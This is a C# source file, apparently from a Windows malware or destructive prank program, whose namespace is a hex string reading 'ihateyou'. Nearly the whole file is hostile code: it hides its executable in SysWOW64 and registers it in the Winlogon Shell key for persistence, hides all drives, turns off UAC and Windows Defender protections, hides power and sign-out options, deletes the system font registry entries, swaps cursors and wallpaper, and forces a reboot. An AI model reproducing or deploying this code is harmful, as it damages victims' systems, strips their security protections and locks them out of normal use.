using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;

namespace _6968617465796f750d0a.Services.Regedit
{
    internal class Implementions
    {

        private protected string[] KeysCursors =
        {
            "AppStarting", "Arrow", "Hand", "Help", "No", "IBeam", 
            "Crosshair", "NWPen", "Pin", "Person", "SizeAll", "SizeNESW", 
            "SizeNS", "SizeNWSE", "SizeWE", "UpArrow", "Wait"
        };

        private TaskManager.Blackouts taskmng = new TaskManager.Blackouts();

        public async void ExecuteAll()
        {

            taskmng.runTask();
            
            createDirectory();
            hideDrives();
            addToWinlogon();
            disableUAC();
            disablePowerButtons();
            changeCursor();
            disableDefender();
            changeTTF();
            changeWallpaper();

            await Task.Delay(1000);

            Process.Start("shutdown", "/r /t 0");

        }

        private void createDirectory()
        {
            if (Directory.Exists(@"C:\ProgramData\Temp")) Directory.Delete(@"C:\ProgramData\Temp", true);
            Directory.CreateDirectory(@"C:\ProgramData\Temp");
        }

        private void addToWinlogon()
        {

            File.Copy(Environment.CurrentDirectory + @"\6968617465796f750d0a.exe", @"C:\Windows\SysWOW64" + @"\6968617465796f750d0a.exe");
            File.SetAttributes(@"C:\Windows\SysWOW64" + @"\6968617465796f750d0a.exe", FileAttributes.Hidden);

            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
            {
                key.SetValue("Shell", $@"{key.GetValue("Shell").ToString()}, C:\Windows\SysWOW64\6968617465796f750d0a.exe");
                key.Close();
            }

        }

        private void hideDrives()
        {

            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", RegistryKeyPermissionCheck.ReadWriteSubTree))
            {
                key.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
                key.Close();
            };

        }

        private void disableUAC()
        {

            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true)) 
            {
                key.SetValue("EnableLUA", 0);
                key.SetValue("EnableInstallerDetection", 0);
                key.SetValue("PromptOnSecureDesktop", 0);
                key.SetValue("ConsentPromptBehaviorAdmin", 0);
                key.SetValue("EnableSecureUIAPaths", 0);
                key.SetValue("EnableVirtualization", 0);
                key.SetValue("FilterAdministratorToken", 0);
                key.SetValue("EnableUIADesktopToggle", 0);

                key.Close();
            }

        }

        private void changeCursor()
        {

            System.Windows.Resources.StreamResourceInfo res =
                    Application.GetResourceStream(new Uri(@"Resources\Theme\main.cur", UriKind.Relative));

            res.Stream.CopyTo(new System.IO.FileStream(@"C:\ProgramData\Temp\cursor.cur", System.IO.FileMode.OpenOrCreate));

            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors", true))
            {   

                foreach(string Key in KeysCursors)
                {
                    key.SetValue(Key, @"C:\ProgramData\Temp\cursor.cur");
                }

                key.Close();

            }

        }

        private void disablePowerButtons()
        {

            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep", true))
            {
                key.SetValue("value", 1);
                key.Close();
            }

            using (RegistryKey key1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HideSignOut", true))
            {
                key1.SetValue("value", 1);
                key1.Close();
            }

            using (RegistryKey key2 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown", true))
            {
                key2.SetValue("value", 1);
                key2.Close();
            }

            using (RegistryKey key3 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart", true))
            {
                key3.SetValue("value", 1);
                key3.Close();
            }

            using (RegistryKey key4 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HideLock", true))
            {
                key4.SetValue("value", 1);
                key4.Close();
            }

            using (RegistryKey key5 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HidePowerButton", true))
            {
                key5.SetValue("value", 1);
                key5.Close();
            }

            using (RegistryKey key6 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\PolicyManager\default\Start\HidePowerHibernate", true))
            {
                key6.SetValue("value", 1);
                key6.Close();
            }

        }

        private void changeTTF()
        {

            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts", true))
            {   

                foreach(string name in key.GetValueNames())
                {
                    key.DeleteValue(name);
                }

                key.Close();

                using (RegistryKey key1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\FontSubstitutes", true))
                {
                    key1.SetValue("Segoe UI", "6968617465796f750d0a");
                    key1.Close();
                }

            }

        }

        private void disableDefender()
        {

            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", true))
                {

                    key.SetValue("DisableAntiSpyware", 1);
                    key.SetValue("AllowFastServiceStartup", 0);
                    key.SetValue("ServiceKeepAlive", 0);

                    key.Close();

                }

                using (RegistryKey key1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true))
                {

                    key1.SetValue("DisableRealtimeMonitoring", 1);
                    key1.SetValue("DisableOnAccessProtection", 1);
                    key1.SetValue("DisableScanOnRealtimeEnable", 1);
                    key1.SetValue("DisableBehaviorMonitoring", 1);
                    key1.SetValue("DisableScanOnRealtimeEnable", 1);

                    key1.Close();

                }

            } catch
            {
            }

        }

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private void changeWallpaper()
        {

            System.Windows.Resources.StreamResourceInfo res =
                Application.GetResourceStream(new Uri(@"Resources\Theme\wall.bmp", UriKind.Relative));

            res.Stream.CopyTo(new System.IO.FileStream(@"C:\ProgramData\Temp\wall.bmp", System.IO.FileMode.OpenOrCreate));

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"C:\ProgramData\Temp\wall.bmp", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        }

    }
}
